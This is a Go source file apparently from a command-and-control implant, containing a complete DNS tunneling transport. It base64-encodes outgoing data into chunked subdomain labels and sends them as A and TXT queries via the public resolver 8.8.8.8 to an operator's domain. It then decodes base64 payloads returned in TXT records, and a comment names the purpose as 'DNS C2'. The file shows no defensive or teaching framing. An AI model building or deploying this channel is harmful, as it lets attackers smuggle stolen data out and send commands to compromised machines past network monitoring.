package comms

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"strings"
	"time"
)

type DnsMessageSender struct {
	Server string // Format: "1.2.3.4:53"
	Domain string // Format: "domain.com"
}

func NewDnsMessageSender(server string) *DnsMessageSender {
	domain := server
	if strings.Contains(server, "://") {
		domain = strings.Split(server, "://")[1]
	}
	if strings.Contains(domain, "/") {
		domain = strings.Split(domain, "/")[0]
	}

	// Assume nameserver is 8.8.8.8 for simplicity, or we parse from resolv.conf if we had more code
	// Usually in DNS C2, the domain is the "host" field of the listener
	// Let's fallback to asking system resolver (e.g. 8.8.8.8) to resolve our domain
	return &DnsMessageSender{
		Server: "8.8.8.8:53",
		Domain: domain,
	}
}

// SendMessage chunks routingPacket and sends it as DNS TXT/A requests, returning the decoded server response.
func (s *DnsMessageSender) SendMessage(routingPacket []byte) ([]byte, error) {
	conn, err := net.Dial("udp", s.Server)
	if err != nil {
		return nil, err
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	if len(routingPacket) == 0 {
		return nil, nil
	}

	b64Data := base64.RawURLEncoding.EncodeToString(routingPacket)

	chunkSize := 50
	totalChunks := (len(b64Data) + chunkSize - 1) / chunkSize

	b := make([]byte, 2)
	rand.Read(b)
	msgID := binary.BigEndian.Uint16(b)%9000 + 1000 // To match r<id> 4 digits

	var lastResponse []byte

	for i := 0; i < totalChunks; i++ {
		start := i * chunkSize
		end := start + chunkSize
		if end > len(b64Data) {
			end = len(b64Data)
		}

		chunk := b64Data[start:end]
		// Format: r<id>c<idx>t<tot>.<b64>.<server>
		queryDomain := fmt.Sprintf("r%dc%dt%d.%s.%s", msgID, i, totalChunks, chunk, s.Domain)

		qType := 1 // Type A for chunks if we aren't expecting a big response yet
		if i == totalChunks-1 {
			qType = 16 // TXT for the final chunk/GET
		}

		resp, err := s.sendSingleQuery(conn, queryDomain, qType)
		if err != nil {
			return nil, err
		}
		if resp != nil {
			lastResponse = resp
		}
		time.Sleep(100 * time.Millisecond) // short delay to prevent UDP drops
	}

	return lastResponse, nil
}

func (s *DnsMessageSender) sendSingleQuery(conn net.Conn, domain string, qType int) ([]byte, error) {
	packet, err := buildDnsQuery(domain, qType)
	if err != nil {
		return nil, err
	}

	_, err = conn.Write(packet)
	if err != nil {
		return nil, err
	}

	respHeader := make([]byte, 512)
	n, err := conn.Read(respHeader)
	if err != nil {
		return nil, err
	}

	if qType == 16 {
		return parseDnsTxtResponse(respHeader[:n])
	}
	return nil, nil
}

// buildDnsQuery creates a manual DNS query packet for a given domain
func buildDnsQuery(domain string, qType int) ([]byte, error) {
	buf := new(bytes.Buffer)

	id := make([]byte, 2)
	rand.Read(id)
	buf.Write(id)

	buf.Write([]byte{0x01, 0x00}) // Flags
	buf.Write([]byte{0x00, 0x01}) // QDCOUNT: 1
	buf.Write([]byte{0x00, 0x00}) // ANCOUNT: 0
	buf.Write([]byte{0x00, 0x00}) // NSCOUNT: 0
	buf.Write([]byte{0x00, 0x00}) // ARCOUNT: 0

	labels := strings.Split(domain, ".")
	for _, label := range labels {
		if len(label) > 63 {
			return nil, errors.New("DNS label too long")
		}
		buf.WriteByte(byte(len(label)))
		buf.WriteString(label)
	}
	buf.WriteByte(0x00) // End of QNAME

	buf.Write([]byte{0x00, byte(qType)}) // QTYPE
	buf.Write([]byte{0x00, 0x01})        // QCLASS: 1 (IN)

	return buf.Bytes(), nil
}

// parseDnsTxtResponse parses a manual DNS response and extracts the first TXT record
func parseDnsTxtResponse(data []byte) ([]byte, error) {
	if len(data) < 12 {
		return nil, errors.New("DNS response too short")
	}

	qdCount := binary.BigEndian.Uint16(data[4:6])
	anCount := binary.BigEndian.Uint16(data[6:8])

	if anCount == 0 {
		return nil, nil
	}

	offset := 12
	// Skip Question Section
	for i := 0; i < int(qdCount); i++ {
		for offset < len(data) && data[offset] != 0 {
			if data[offset]&0xC0 == 0xC0 {
				offset += 2
				break
			} else {
				length := int(data[offset])
				offset += 1 + length
			}
		}
		if offset < len(data) && data[offset] == 0 {
			offset++
		}
		offset += 4
	}

	// Read Answer Section
	for i := 0; i < int(anCount); i++ {
		if offset >= len(data) {
			return nil, errors.New("malformed response")
		}

		if data[offset]&0xC0 == 0xC0 {
			offset += 2
		} else {
			for offset < len(data) && data[offset] != 0 {
				offset += 1 + int(data[offset])
			}
			offset++
		}

		if offset+10 > len(data) {
			return nil, errors.New("malformed response")
		}

		qType := binary.BigEndian.Uint16(data[offset : offset+2])
		rdLength := binary.BigEndian.Uint16(data[offset+8 : offset+10])
		offset += 10

		if offset+int(rdLength) > len(data) {
			return nil, errors.New("malformed response")
		}

		if qType == 16 { // TXT
			txtLen := int(data[offset])
			if txtLen > 0 && offset+1+txtLen <= len(data) {
				txtData := data[offset+1 : offset+1+txtLen]
				res := string(txtData)
				// Pad and decode base64
				res = strings.ReplaceAll(res, "-", "+")
				res = strings.ReplaceAll(res, "_", "/")
				pad := len(res) % 4
				if pad > 0 {
					res += strings.Repeat("=", 4-pad)
				}

				decoded, err := base64.StdEncoding.DecodeString(res)
				if err != nil {
					return txtData, nil
				}
				return decoded, nil
			}
		}
		offset += int(rdLength)
	}

	return nil, nil
}
